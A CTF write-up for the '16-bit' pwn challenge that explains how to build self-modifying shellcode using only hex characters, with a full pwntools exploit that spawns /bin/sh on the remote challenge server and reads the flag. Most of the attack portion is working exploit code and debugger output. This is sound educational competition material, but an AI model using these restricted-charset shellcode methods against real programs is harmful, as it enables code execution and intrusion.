# 16-bit

### So Many XORs

The description for this challenge is as follows:

*During the ICC competition we where given a shellcoding challenge to make a base64 encoded shellcode, ie the shellcode could only consist of the characters "a-zA-Z0-9+/=", during an 8 hour ctf we completed it in about 1.5 hours. How long will it take you to create base16 shellcode?*

*Author: lms*

This was one of the harder pwn challenges in the competition, and was still worth 496 out of a possible 500 points by the end of the competition. In summary, it is a fairly fiddly shellcoding exercise that only allows the digits 0-9 and letters A-F. Originally, only the challenge binary was included, but the libc file was added in later on. 

**TL;DR Solution:** Reverse-engineer the program enough to determine that it will take your input, encode it to base16, and execute it as shellcode. Try various combinations in the allowed character set with a disassembly to get a feel for the allowed instructions with a self-modifying shellcode in mind, and also examine the pre-existing state of registers in a debugger when the shellcode starts to be executed. Primarily use instructions of the type "xor al, 0x31;" to iterate rax up and down (rax points to the start of shellcode at the beginning), "xor dh, BYTE PTR [rax];" to edit the value of the dh register (always starts as null), and "xor BYTE PTR [rax], dh;" to edit the value to which rax is pointing, accomplishing the self-modifying component. Add in "xor byte PTR [rax], bh;" to edit bytes to be larger than 0x7f with 1/16 odds of success. Use this methodology to create an 8-byte read shellcode that takes advantage of existing values in rsi and rdx to take input from the terminal and write to the shellcode area, and use that to load in a full execve('/bin/sh') shellcode.

## Gathering Information

The description is already fairly explicit about the expectations for this challenge, but it is still worth determining exactly how the binary works. If I just run the program and input all a's, I get a segmentation fault with no additional context.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/CyberOpen22$ ./16_bit
Data:
aaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault
```
If we open up the program in Ghidra, it looks like our shellcode is getting loaded into an mmapped rwx section at a static location, run through some sort of encoding function, and executed. Based on the challenge, we can probably safely assume that the encoding in question is base16.
```
undefined8 main(void)

{
  void *pvVar1;
  
  setup();
  pvVar1 = mmap((void *)0x133713370000,0x1000,7,0x32,-1,0);
  if (pvVar1 != (void *)0x133713370000) {
    puts("mmap failed");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
                    /* read into static location */
  read(0,(void *)0x133713370000,100);
  encode(0x133713370000);
  (*(code *)0x133713370000)();
  return 0;
}
```
We can further confirm this in GDB by setting a breakpoint at the point where the shellcode address is called: a set of ten a's and a newline is turned into "616161616161616161610A" followed by a lot of 0's that are presumably encoded nulls. This also shows that the alphabet component is uppercase, not lowercase.
```
0x555555555439 <main+136>       mov    rdi, rax
   0x55555555543c <main+139>       call   0x555555555258 <encode>
   0x555555555441 <main+144>       mov    rax, QWORD PTR [rbp-0x10]
 → 0x555555555445 <main+148>       call   rax
   0x555555555447 <main+150>       mov    eax, 0x0
   0x55555555544c <main+155>       leave
   0x55555555544d <main+156>       ret
   0x55555555544e                  xchg   ax, ax
   0x555555555450 <__libc_csu_init+0> push   r15
─────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0x133713370000 (
   $rdi = 0x00007fffffffdfa0 → "aaaaaaaaaa\n"
)
─────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "16_bit", stopped 0x555555555445 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555445 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/s $rax
0x133713370000: "616161616161616161610A", '0' <repeats 178 times>
gef➤
```
At this point, we can also examine the pre-existing register values, since this tends to be very helpful in restricted shellcode scenarios. In particular, rax, rsi, and rdx all seem to be based on the shellcode area. 
```
gef➤  info registers
rax            0x133713370000      0x133713370000
rbx            0x555555555450      0x555555555450
rcx            0x555555558060      0x555555558060
rdx            0x1337133700c6      0x1337133700c6
rsi            0x133713370000      0x133713370000
rdi            0x7fffffffdfa0      0x7fffffffdfa0
rbp            0x7fffffffe050      0x7fffffffe050
rsp            0x7fffffffe040      0x7fffffffe040
r8             0xffffffff          0xffffffff
r9             0x0                 0x0
r10            0x5555555545a9      0x5555555545a9
r11            0x7ffff7f505f0      0x7ffff7f505f0
r12            0x5555555550b0      0x5555555550b0
r13            0x7fffffffe140      0x7fffffffe140
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x555555555445      0x555555555445 <main+148>
eflags         0x202               [ IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
```
Now, since this is a very restricted environment, we probably want to keep the shellcode to be executed as short and simple as possible. One great way to do that is by doing a read into the shellcode area, which can typically be done in far fewer bytes than a full execve(/bin/sh) shellcode, which can be input later when the read is called. In this case, the read call also only needs to have rdi and rax modified, since rsi is pointing toward to the shellcode area and rdx is a large, non-negative number. As a result, our goal shellcode is:
```
xor rdi, rdi;
xor rax, rax;
syscall;
```
Which compiles to an eight-byte long `H1\xffH1\xc0\x0f\x05`

## Selecting Useful Instructions

My methodology for finding assembly instructions for this challenges was to use pwntools in a python console to disassemble test combinations of the allowed bytes and see what assembly instructions they correspond to. In hindsight, I could have done better since I basically decided I had enough instructions after testing two-byte instructions and did not find any useful three-byte instructions in my handful of tests; in future, I would recommend actually scripting out something to test all possible combinations up to some number of bytes in order to avoid missing something important, since I have since learned that three-byte instructions that would have been helpful do exist.
```
>>> from pwn import *
>>> context.clear(arch='amd64')
>>> disasm(b'0')
'   0:   30                      .byte 0x30'
>>>
```
Of the instructions that I was able to find, here are the ones that stuck out the most. In particular, operations involving the rax register stuck out as very interesting because the register is pre-populated with the shellcode's starting address, I can edit the low byte (al register) by XORing it with one of our allowed characters in order to adjust the byte of shellcode to which it is pointing, I am able to edit the byte to which rax is pointing by XORing it with the dh or bh register (second lowest byte of rdx and rbx respectively), and I am also able to use the byte to which rax is pointing in order to edit the dh or bh registers themselves. 
```
disasm(b'40')
'   0:   34 30                   xor    al, 0x30'
>>> disasm(b'00')
'   0:   30 30                   xor    BYTE PTR [rax], dh'
>>> disasm(b'08')
'   0:   30 38                   xor    BYTE PTR [rax], bh'
>>> disasm(b'20')
'   0:   32 30                   xor    dh, BYTE PTR [rax]'
>>> disasm(b'28')
'   0:   32 38                   xor    bh, BYTE PTR [rax]'
```
For an additional bit of context, since rdx is always pointing to the same, static shellcode location, dh has a constant starting value of 0x0 (from 0x1337133700c6). On the other hand, rbx points to a PIE value. Since bh is the second lowest byte, its lowest nibble is one of the lowest three nibbles in the address, which will be a constant value (in this case, 4); however, its higher nibble can have any one of 16 values. As a result, I held off on using bh as long as possible until I realized that if I did not use it, I could only modify bytes to values that you can obtain by XORing combinations of 0x30-0x39 and 0x41-0x46. If you convert those numbers to 8-bit binary, the highest bit will never be set, so XORing cannot create bytes where the highest bit, so we can't make shellcode with bytes like 0xff or 0xc0, which exist in our target shellcode. As a result, I either had to edit my target shellcode to only use more achievable bytes, risking making my shellcode too long since I only have about 200 bytes, finding additional instructions, or using the bh register with an assumed value that will be hit 1/16 times; I opted for the latter.

To clarify, my shellcode modification methodology basically boils down to:

#1. Use instructions like `xor al, 0x30` to make rax point to specific bytes.

#2. Use the byte to which rax is pointing to edit dh or bh with instructions like `xor dh, BYTE PTR [rax]`

#3. Use something like `xor al, 0x30` again to point rax at another byte.

#4. Actually edit the byte to which rax is pointing using something like `xor BYTE PTR [rax], dh`

Some steps in that outline may get repeated depending on how many XORs are needed to get the desired byte written given our selection of bytes. I ended up placing the bytes to be edited at an offset of 0x70 since that was relatively simple to get rax pointed at (i.e. 0x70 = 0x41 ^ 0x31). I also opted to place some valid instructions chosen primarily for the bytes that they contain around 0x30 in order to make it easier to xor dh or bh with various bytes based on the value to which rax is pointing.

I also used sequences of 60's as a stand-in for NOPs in order to get through some of the spaces between areas of my shellcode. This creates `the xor BYTE PTR [rsi], dh`, which is relatively harmless; this padding simply needs to be of an even length.

## Writing the Shellcode

### Writing 0x48

With all that in mind, we can start writing the full shellcode! As a refresher, we want to write the bytes `H1\xffH1\xc0\x0f\x05` 0x70 bytes from the start of the shellcode area. On the bright side, this code contains two 1's, which are actually allowed bytes that I don't have to edit!

I opted to start with the H's, and did both of them at once for a slight efficiency gain. H = 0x48, and 0x48 = 0x41 ^ 0x30 ^ 0x39. As a result, the plan here was:

#1. Strategically pre-populate certain offsets with useful bytes. Specifically, I put `xor dh, BYTE PTR [rax]; xor al, 0x39;`, or `2049`, at offset 0x30 to get easy access to bytes 0x30 and 0x39, and 0x41 at offsets 0x70 and 0x73 (as well as 0x31's at 0x71 and 0x74) so that they can be transformed into 0x48's more easily.

#2. Get rax pointed at a 0x39 byte (note the specific sequence of byte values doesn't really matter)

#3. XOR dh with that value. dh starts at null, so it will just equal 0x39 now.

#4. Move rax to pointing at a 0x30 byte.

#5. XOR dh with that byte. Now dh = 0x09.

#6. Move rax to pointing at the byte at offset 0x70. 

#7. XOR dh (0x09) with the value at that offset 0x70 (0x41). Now it is 0x48!

#8. Move rax up to offset 0x73 and XOR that byte with dh again to get another 0x48.

Here is the shellcode to achieve this:
```
from pwn import *

target = process('./chal_patched') #, env={'LD_PRELOAD': 'libc_16bit.so.6'})

pid = gdb.attach(target, "\nb *main+148\n set disassembly-flavor intel\ncontinue")
#target = remote('0.cloud.chals.io', 23261)
context.clear(arch='amd64')
import base64

#Write in the first H
shellcode = asm('''
xor al, 0x33; 
xor dh, BYTE PTR [rax];
xor al, 0x33;
xor al, 0x31;
xor dh, BYTE PTR [rax];
xor al, 0x41;
xor BYTE PTR [rax], dh;
''')
#Write in the second H
shellcode += asm('''
xor al, 0x33;
xor al, 0x30;
xor BYTE PTR [rax], dh;
''')

print(len(shellcode))
shellcode += asm('xor BYTE PTR [rsi], dh;') * ((0x30 - len(shellcode)) // 2)
shellcode += asm('''
xor dh, BYTE PTR [rax]
xor al, 0x39;
''')

payload = base64.b16decode(shellcode + asm('xor BYTE PTR [rsi], dh;') * ((0x70 - len(shellcode)) // 2) + b'A' + b'10' + b'A' + b'1' + b'0' * 3) 

print(payload)
target.sendline(payload)

target.interactive()
```
And here is a GDB snippet showing the success off this operation:
```
 → 0x133713370014                  xor    BYTE PTR [rax], dh
   0x133713370016                  xor    BYTE PTR [rax], dh
   0x133713370018                  xor    BYTE PTR [rax], dh
   0x13371337001a                  xor    BYTE PTR [rax], dh
   0x13371337001c                  xor    BYTE PTR [rax], dh
   0x13371337001e                  xor    BYTE PTR [rax], dh
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal_patched", stopped 0x133713370014 in ?? (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x133713370014 → xor BYTE PTR [rax], dh
[#1] 0x55b7182c7447 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/8bx 0x133713370070
0x133713370070: 0x48    0x31    0x30    0x48    0x31    0x30    0x30    0x30
```

### Writing 0xff and 0xc0:

The next byte to write is 0xff at offset 0x72. This introduces the necessity of finding a larger byte to add into the XOR operation, and I opted to use the bh register on the 1/16 odds that it equals 0xf4. Now, 0xff = 0xf4 ^ 0xb, and 0xb = 0x9 ^ 0x30 ^ 0x32; 0x9 is included since that is the pre-existing value in dh. This means that we can insert a relative short shellcode snippet can be inserted directly after the `xor BYTE PTR [rax], dh` instruction that writes the last H:
```
#Remember dh = 0x9 and al = 0x73 at this point.
shellcode += asm('''
xor al, 0x42;
xor dh, BYTE PTR [rax];
xor al, 0x43;
xor BYTE PTR [rax], bh;
xor BYTE PTR [rax], dh; 
''')
```
We can confirm that this is working in GDB by manually setting bh to 0xf4 (`set $bh=0xf4`) before instructions involving that register. We now have an `xor rdi, rdi` instruction!
```
   0x13371337001e                  xor    BYTE PTR [rax], dh
   0x133713370020                  xor    BYTE PTR [rax], dh
   0x133713370022                  xor    BYTE PTR [rax], dh
   0x133713370024                  xor    BYTE PTR [rax], dh
   0x133713370026                  xor    BYTE PTR [rax], dh
   0x133713370028                  xor    BYTE PTR [rax], dh
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal_patched", stopped 0x13371337001e in ?? (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x13371337001e → xor BYTE PTR [rax], dh
[#1] 0x55be9ed5a447 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/8bx 0x133713370070
0x133713370070: 0x48    0x31    0xff    0x48    0x31    0x30    0x30    0x30
gef➤  x/i 0x133713370070
   0x133713370070:      xor    rdi,rdi
```
From this point, writing 0xc0 at 0x75 is relatively simple. 0xc0 = 0xf4 ^ 0x34, so we can just prepopulate the offset with a 0x34, move rax over there, and XOR it with bh. So, just add:
```
shellcode += asm('''
xor al, 0x30;
xor al, 0x37;
xor BYTE PTR [rax], bh;
''')
```
And view the results in GDB. Now we have two out three instructions fully written!
```
→ 0x133713370024                  xor    BYTE PTR [rax], dh
   0x133713370026                  xor    BYTE PTR [rax], dh
   0x133713370028                  xor    BYTE PTR [rax], dh
   0x13371337002a                  xor    BYTE PTR [rax], dh
   0x13371337002c                  xor    BYTE PTR [rax], dh
   0x13371337002e                  xor    BYTE PTR [rax], dh
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal_patched", stopped 0x133713370024 in ?? (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x133713370024 → xor BYTE PTR [rax], dh
[#1] 0x5625ff5c3447 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/8bx 0x133713370070
0x133713370070: 0x48    0x31    0xff    0x48    0x31    0xc0    0x30    0x30
gef➤  x/2i 0x133713370070
   0x133713370070:      xor    rdi,rdi
   0x133713370073:      xor    rax,rax
gef➤
```

### Writing Syscall

The bytes in syscall are also relatively simple to achieve, so it makes sense to focus on those next. 0x0f = 0x39 ^ 0x36 (dh is already set to 0x39), and 0x05 = 0x39 ^ 0xf 0x33 (just do an xor dh, BYTE PTR [rax] immediately after setting BYTE PTR [rax] to 0xf). At this point, I was quite close to the arbitrary bytes that I had place in the middle of my space, so I only had space for the 0x0f write before that. So, after that write, I have some instances of `xor BYTE PTR [rsi], dh;`, which should write to writeable memory whose content no longer matters, then the `xor dh, BYTE PTR [rax]; xor al, 0x39;`. The first instruction gets dh to the desired value, then I can just do some additional XORs to get rax to point at the desired spot, XOR it, and finish the syscall! The relevant portion of code is:
```
#Writing the 0x0f to 0x76:
#Remember dh = 0x39 and al = 0x75 at this point.
shellcode += asm('''
xor al, 0x30;
xor al, 0x33;
xor BYTE PTR [rax], dh;
''')
#Writing the 0x05 to 0x77:
#Remember dh = 0x39 and al = 0x75 at this point.

print(len(shellcode))
shellcode += asm('xor BYTE PTR [rsi], dh;') * ((0x30 - len(shellcode)) // 2)
shellcode += asm('''
xor dh, BYTE PTR [rax]
xor al, 0x39;
''')

shellcode += asm('''
xor al, 0x39;
xor al, 0x30;
xor al, 0x31;
xor BYTE PTR [rax], dh;
''')

payload = base64.b16decode(shellcode + asm('xor BYTE PTR [rsi], dh;') * ((0x70 - len(shellcode)) // 2) + b'A' + b'12' + b'A' + b'14' + b'63')
```
If we run the code, and set bh = 0xf4 in a debugger (or get lucky), we can see that we successfully trigger a read.
```
0x13371337006e                  xor    BYTE PTR [rsi], dh
   0x133713370070                  xor    rdi, rdi
   0x133713370073                  xor    rax, rax
 → 0x133713370076                  syscall
   0x133713370078                  xor    BYTE PTR [rcx+0x30], al
   0x13371337007b                  xor    BYTE PTR [rax], dh
   0x13371337007d                  xor    BYTE PTR [rax], dh
   0x13371337007f                  xor    BYTE PTR [rax], dh
   0x133713370081                  xor    BYTE PTR [rax], dh
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal_patched", stopped 0x133713370076 in ?? (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x133713370076 → syscall
[#1] 0x556ffa0d7447 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
...
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/CyberOpen22$ python3 16_bit_writeup.py
[+] Starting local process './chal_patched': pid 22654
[*] running in new terminal: ['/usr/bin/gdb', '-q', './chal_patched', '22654', '-x', '/tmp/pwnil9sxkp4.gdb']
[+] Waiting for debugger: Done
42
b'C CA J\x00C@\x00K L\x08\x00@G\x08@C\x00\x06\x06\x06 II@A\x00\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\xa1*\x14c'
[*] Switching to interactive mode
Data:
$ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
$
```

## Second-Stage Shellcode for Shell

Now that I have a read in place, I can just send in whatever shellcode I want, and it will be executed as long as I include enough padding at the beginning to make the start of my actual code level with end of my read call (0x80 bytes of NOPs is about right!). As a result, I wrote a simple execve('/bin/sh') shellcode; I avoided pushes and pops since those seemed to be causing issues on my local machine. The full, final exploit script is:
```
from pwn import *

#target = process('./chal_patched') #, env={'LD_PRELOAD': 'libc_16bit.so.6'})

#pid = gdb.attach(target, "\nb *main+148\n set disassembly-flavor intel\ncontinue")
target = remote('0.cloud.chals.io', 23261)
context.clear(arch='amd64')
import base64

#Write in the first H
shellcode = asm('''
xor al, 0x33; 
xor dh, BYTE PTR [rax];
xor al, 0x33;
xor al, 0x31;
xor dh, BYTE PTR [rax];
xor al, 0x41;
xor BYTE PTR [rax], dh;
''')
#Write in the second H
shellcode += asm('''
xor al, 0x33;
xor al, 0x30;
xor BYTE PTR [rax], dh;
''')
#Writing the 0xff:
#Remember dh = 0x9 and al = 0x73 at this point.
shellcode += asm('''
xor al, 0x42;
xor dh, BYTE PTR [rax];
xor al, 0x43;
xor BYTE PTR [rax], bh;
xor BYTE PTR [rax], dh; 
''')
#Writing the 0xc0:
#Remember dh = 0x39 and al = 0x72 at this point.
shellcode += asm('''
xor al, 0x30;
xor al, 0x37;
xor BYTE PTR [rax], bh;
''')
#Writing the 0x0f to 0x76:
#Remember dh = 0x39 and al = 0x75 at this point.
shellcode += asm('''
xor al, 0x30;
xor al, 0x33;
xor BYTE PTR [rax], dh;
''')
#Writing the 0x05 to 0x77:
#Remember dh = 0x39 and al = 0x75 at this point.

print(len(shellcode))
shellcode += asm('xor BYTE PTR [rsi], dh;') * ((0x30 - len(shellcode)) // 2)
shellcode += asm('''
xor dh, BYTE PTR [rax]
xor al, 0x39;
''')

shellcode += asm('''
xor al, 0x39;
xor al, 0x30;
xor al, 0x31;
xor BYTE PTR [rax], dh;
''')



payload = base64.b16decode(shellcode + asm('xor BYTE PTR [rsi], dh;') * ((0x70 - len(shellcode)) // 2) + b'A' + b'12' + b'A' + b'14' + b'63') 

print(payload)
target.sendline(payload)

payload2 = b'\x90' * 0x80
payload2 += asm('''
lea rdi, [rip+0x30];
xor rsi, rsi;
xor rdx, rdx;
mov rax, 59;
syscall;
''')
payload2 += b'\x90' * (0x30 - len(payload2) + 0x80 + 7) + b'/bin/sh\x00'

target.sendline(payload2)
target.interactive()
```
Then you just run it a few times until you get a shell; if my odds of success were worse, I would have set up a proper while loop and automatically printed the flag out if possible:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/CyberOpen22$ python3 16_bit_writeup.py
[+] Opening connection to 0.cloud.chals.io on port 23261: Done
42
b'C CA J\x00C@\x00K L\x08\x00@G\x08@C\x00\x06\x06\x06 II@A\x00\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\x06\xa1*\x14c'
[*] Switching to interactive mode
Data:
$ ls
-
banner_fail
bin
boot
chal
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
service.conf
srv
sys
tmp
usr
var
wrapper
$ cat flag.txt
uscg{Nothing_Like_A_Bit_Of_Shellcode_For_The_Week}
$
```
For additional reference, the base16-encoded shellcode looks like `43204341204A004340004B204C08004047084043000606062049494041000606060606060606060606060606060606060606060606060606A12A14630A`

Thanks for reading!
